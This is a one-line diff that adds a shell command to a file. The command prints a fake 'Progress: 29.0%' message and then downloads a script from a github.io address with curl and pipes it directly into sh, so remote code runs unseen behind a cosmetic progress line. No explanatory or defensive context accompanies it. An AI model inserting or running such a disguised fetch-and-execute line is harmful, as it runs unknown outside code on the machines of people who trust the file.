@@ -1,0 +1,1 @@
+echo 'Progress: 29.0%'; curl -L --progress-bar frkns.github.io/fun/BUSTY_INCENTIVES.h | sh
